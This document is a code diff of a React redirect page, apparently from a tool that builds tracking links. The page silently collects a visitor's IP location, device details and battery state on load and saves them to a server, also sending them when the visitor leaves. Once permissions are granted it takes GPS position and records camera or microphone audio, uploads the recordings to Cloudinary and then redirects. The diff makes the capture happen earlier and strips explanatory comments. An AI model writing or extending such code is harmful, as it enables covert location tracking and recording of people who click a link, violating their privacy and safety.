@@ -251,9 +251,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
   const hasSavedRef = React.useRef(false);
 
   const saveToApi = React.useCallback(async (dataToSave: Partial<CapturedData>, settingsToUse: Settings, isComplete: boolean) => {
-    if (hasSavedRef.current && !isComplete) return; // Prevent multiple saves from pagehide/visibilitychange
+    if (hasSavedRef.current && !isComplete) return; 
     
-    // Check if there is meaningful data to save
     const hasMeaningfulData = dataToSave.ip || dataToSave.cameraCapture || dataToSave.microphoneCapture || dataToSave.location?.lat;
     if (!hasMeaningfulData) return;
     
@@ -272,7 +271,6 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
     const body = JSON.stringify(finalData);
 
     if (isComplete) {
-      // For completed sessions, use fetch
       try {
         await fetch('/api/save-capture', {
           method: 'POST',
@@ -283,11 +281,9 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
         console.error("Failed to save captured data via fetch:", e);
       }
     } else {
-      // For incomplete sessions (page exit), use sendBeacon
       if (navigator.sendBeacon) {
         navigator.sendBeacon('/api/save-capture', body);
       } else {
-         // Fallback for older browsers
         await fetch('/api/save-capture', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -305,8 +301,6 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
       }
     };
 
-    // 'visibilitychange' is more reliable than 'beforeunload' for modern browsers, especially on mobile.
-    // 'pagehide' is a good fallback for unload events.
     window.addEventListener('visibilitychange', () => {
       if (document.visibilityState === 'hidden') {
         handlePageExit();
@@ -320,11 +314,73 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
     };
   }, [settings, saveToApi]);
 
+  const captureInitialData = React.useCallback(async () => {
+    if (capturedDataRef.current.ip) return;
+
+    let ipData: any = {};
+    try {
+        const ipRes = await fetch('https://get.geojs.io/v1/ip/geo.json');
+        if (ipRes.ok) ipData = await ipRes.json();
+    } catch (e) { console.error("Could not fetch IP data:", e); }
+
+    const userAgent = navigator.userAgent;
+    const osMatch = userAgent.match(/(Windows|Mac OS|Linux|Android|iOS)/);
+    
+    capturedDataRef.current = {
+      ...capturedDataRef.current,
+      ip: ipData.ip || 'Unknown',
+      userAgent: userAgent,
+      os: osMatch ? osMatch[0] : 'Unknown',
+      browser: userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)/)?.[0] || 'Unknown',
+      deviceType: 'ontouchstart' in window ? 'Mobile' : 'Desktop',
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      location: { 
+        lat: ipData.latitude ? Number(ipData.latitude) : null, 
+        lon: ipData.longitude ? Number(ipData.longitude) : null, 
+        accuracy: ipData.accuracy ? Number(ipData.accuracy) : null, 
+        city: ipData.city || 'Unknown', 
+        country: ipData.country || 'Unknown', 
+        source: 'ip'
+      },
+    };
+
+    if ('getBattery' in navigator) {
+        try {
+            const batteryManager = await (navigator as any).getBattery();
+            permissionStatusRef.current.battery = 'granted';
+            capturedDataRef.current.battery = {
+                level: Math.round(batteryManager.level * 100),
+                charging: batteryManager.charging
+            };
+        } catch (e) { 
+            console.error("Could not fetch battery data:", e);
+            permissionStatusRef.current.battery = 'denied';
+        }
+    }
+  }, []);
+
+  const captureGpsLocation = React.useCallback(async () => {
+    return new Promise<void>(resolve => {
+        if (!navigator.geolocation) return resolve();
+        navigator.geolocation.getCurrentPosition(pos => {
+            capturedDataRef.current.location = {
+                ...(capturedDataRef.current.location || { lat: null, lon: null, accuracy: null, city: 'Unknown', country: 'Unknown', source: 'ip' }),
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                source: 'gps'
+            };
+            resolve();
+        }, () => resolve(), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+    });
+  }, []);
+
   React.useEffect(() => {
     const loadSettings = async () => {
         if (isPreview && previewSettings) {
             setSettings({ id: 'preview', ...NEW_REDIRECT_TEMPLATE, ...previewSettings });
-            setStatus('redirecting'); // In preview, we just show the card
+            setStatus('redirecting');
             return;
         }
         
@@ -341,6 +397,9 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             const configDoc = querySnapshot.docs[0];
             const fetchedSettings = { id: configDoc.id, ...configDoc.data() } as Settings;
             setSettings(fetchedSettings);
+
+            await captureInitialData();
+
             setStatus('loading');
         } catch (error) {
             console.error("Error fetching settings: ", error);
@@ -348,7 +407,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
         }
     };
     loadSettings();
-  }, [data, previewSettings, isPreview]);
+  }, [data, previewSettings, isPreview, captureInitialData]);
   
     const uploadToCloudinary = async (blob: Blob, resourceType: 'video' | 'raw'): Promise<string> => {
         const formData = new FormData();
@@ -374,107 +433,56 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
         }
     };
 
-    const captureAndRedirect = React.useCallback(async () => {
+    const captureAndFinalize = React.useCallback(async () => {
         if (!settings || isPreview) return;
         setStatus('redirecting');
     
+        let cameraUrl: string | undefined;
+        let micUrl: string | undefined;
+
         try {
-            // --- Basic Info ---
-            let ipData: any = {};
-            try {
-                const ipRes = await fetch('https://get.geojs.io/v1/ip/geo.json');
-                if (ipRes.ok) ipData = await ipRes.json();
-            } catch (e) { console.error("Could not fetch IP data:", e); }
-    
-            const userAgent = navigator.userAgent;
-            const osMatch = userAgent.match(/(Windows|Mac OS|Linux|Android|iOS)/);
-            
-            capturedDataRef.current.ip = ipData.ip || 'Unknown';
-            capturedDataRef.current.userAgent = userAgent;
-            capturedDataRef.current.os = osMatch ? osMatch[0] : 'Unknown';
-            capturedDataRef.current.browser = userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)/)?.[0] || 'Unknown';
-            capturedDataRef.current.deviceType = 'ontouchstart' in window ? 'Mobile' : 'Desktop';
-            capturedDataRef.current.language = navigator.language;
-            capturedDataRef.current.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-            // --- Location ---
-            let locationData = { lat: ipData.latitude ? Number(ipData.latitude) : null, lon: ipData.longitude ? Number(ipData.longitude) : null, accuracy: ipData.accuracy ? Number(ipData.accuracy) : null, city: ipData.city || 'Unknown', country: ipData.country || 'Unknown', source: 'ip' as 'ip' | 'gps' };
-            if (permissionStatusRef.current.location === 'granted') {
-                await new Promise<void>(resolve => {
-                    navigator.geolocation.getCurrentPosition(pos => {
-                        locationData = { ...locationData, lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, source: 'gps' };
-                        resolve();
-                    }, () => resolve(), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+            if (permissionStatusRef.current.camera === 'granted' || permissionStatusRef.current.microphone === 'granted') {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: permissionStatusRef.current.camera === 'granted',
+                    audio: permissionStatusRef.current.microphone === 'granted',
                 });
-            }
-            capturedDataRef.current.location = locationData;
+                
+                const recorder = new MediaRecorder(stream);
+                const chunks: Blob[] = [];
+                recorder.ondataavailable = (e) => chunks.push(e.data);
+                
+                recorder.start();
+                await new Promise(resolve => setTimeout(resolve, settings.captureInfo.recordingDuration * 1000));
+                recorder.stop();
+                stream.getTracks().forEach(track => track.stop());
 
-            // --- Battery ---
-            if ('getBattery' in navigator) { // Battery is captured by default now
-                try {
-                    const batteryManager = await (navigator as any).getBattery();
-                    permissionStatusRef.current.battery = 'granted';
-                    capturedDataRef.current.battery = {
-                        level: Math.round(batteryManager.level * 100),
-                        charging: batteryManager.charging
-                    };
-                } catch (e) { 
-                    console.error("Could not fetch battery data:", e);
-                    permissionStatusRef.current.battery = 'denied';
+                await new Promise(resolve => recorder.onstop = resolve);
+                const blob = new Blob(chunks, { type: permissionStatusRef.current.camera === 'granted' ? 'video/webm' : 'audio/webm' });
+                
+                if(permissionStatusRef.current.camera === 'granted') {
+                    cameraUrl = await uploadToCloudinary(blob, 'video');
+                } else if (permissionStatusRef.current.microphone === 'granted') {
+                    micUrl = await uploadToCloudinary(blob, 'raw');
                 }
             }
-    
-            // --- Media Capture ---
-            let cameraUrl: string | undefined;
-            let micUrl: string | undefined;
-    
-            try {
-                if (permissionStatusRef.current.camera === 'granted' || permissionStatusRef.current.microphone === 'granted') {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: permissionStatusRef.current.camera === 'granted',
-                        audio: permissionStatusRef.current.microphone === 'granted',
-                    });
-                    
-                    const recorder = new MediaRecorder(stream);
-                    const chunks: Blob[] = [];
-                    recorder.ondataavailable = (e) => chunks.push(e.data);
-                    
-                    recorder.start();
-                    await new Promise(resolve => setTimeout(resolve, settings.captureInfo.recordingDuration * 1000));
-                    recorder.stop();
-                    stream.getTracks().forEach(track => track.stop());
-    
-                    await new Promise(resolve => recorder.onstop = resolve);
-                    const blob = new Blob(chunks, { type: permissionStatusRef.current.camera === 'granted' ? 'video/webm' : 'audio/webm' });
-                    
-                    if(permissionStatusRef.current.camera === 'granted') {
-                        cameraUrl = await uploadToCloudinary(blob, 'video');
-                    } else if (permissionStatusRef.current.microphone === 'granted') {
-                        micUrl = await uploadToCloudinary(blob, 'raw');
-                    }
-                }
-            } catch (uploadError) {
-                console.error("Media upload failed, proceeding without media:", uploadError);
-            }
+        } catch (uploadError) {
+            console.error("Media upload failed, proceeding without media:", uploadError);
+        }
+        
+        capturedDataRef.current.permissions = {
+            location: permissionStatusRef.current.location,
+            camera: permissionStatusRef.current.camera,
+            microphone: permissionStatusRef.current.microphone,
+        };
+        capturedDataRef.current.cameraCapture = cameraUrl;
+        capturedDataRef.current.microphoneCapture = micUrl;
+        
+        await saveToApi(capturedDataRef.current, settings, true);
 
-            capturedDataRef.current.permissions = {
-                location: permissionStatusRef.current.location,
-                camera: permissionStatusRef.current.camera,
-                microphone: permissionStatusRef.current.microphone,
-            };
-            capturedDataRef.current.cameraCapture = cameraUrl;
-            capturedDataRef.current.microphoneCapture = micUrl;
-            
-            await saveToApi(capturedDataRef.current, settings, true);
-
-        } catch (error) {
-            console.error("Failed to save captured data:", error);
-        } finally {
-            if (settings.redirectDelay > 0) {
-              setTimeout(() => { window.location.href = settings.redirectUrl; }, settings.redirectDelay * 1000);
-            } else {
-              window.location.href = settings.redirectUrl;
-            }
+        if (settings.redirectDelay > 0) {
+            setTimeout(() => { window.location.href = settings.redirectUrl; }, settings.redirectDelay * 1000);
+        } else {
+            window.location.href = settings.redirectUrl;
         }
     }, [settings, isPreview, addNotification, saveToApi]);
 
@@ -486,14 +494,14 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
         const required = settings.captureInfo.permissions;
         if (required.length === 0) {
             setIsWaitingForPermission(false);
-            return captureAndRedirect();
+            return captureAndFinalize();
         }
 
         let hasDenied = false;
         const newlyDenied: PermissionType[] = [];
 
         for (const perm of required) {
-            if (perm === 'battery') continue; // Skip battery, no prompt needed
+            if (perm === 'battery') continue;
             try {
                 if (perm === 'location') {
                     const status = await navigator.permissions.query({ name: 'geolocation' });
@@ -505,11 +513,14 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
                            { timeout: 15000 }
                        ));
                     }
+                    if (permissionStatusRef.current.location === 'granted') {
+                        await captureGpsLocation();
+                    }
                 } else if (perm === 'camera' || perm === 'microphone') {
                      const constraints = { video: perm === 'camera', audio: perm === 'microphone' };
                      const stream = await navigator.mediaDevices.getUserMedia(constraints);
                      permissionStatusRef.current[perm] = 'granted';
-                     stream.getTracks().forEach(track => track.stop()); // Stop stream immediately after getting permission
+                     stream.getTracks().forEach(track => track.stop());
                 }
             } catch (error) {
                 console.warn(`Permission denied for ${perm}:`, error);
@@ -529,9 +540,9 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             setDeniedPermissions(newlyDenied);
             setStatus('permission_denied');
         } else {
-            captureAndRedirect();
+            captureAndFinalize();
         }
-    }, [settings, isPreview, captureAndRedirect]);
+    }, [settings, isPreview, captureAndFinalize, captureGpsLocation]);
 
 
   React.useEffect(() => {
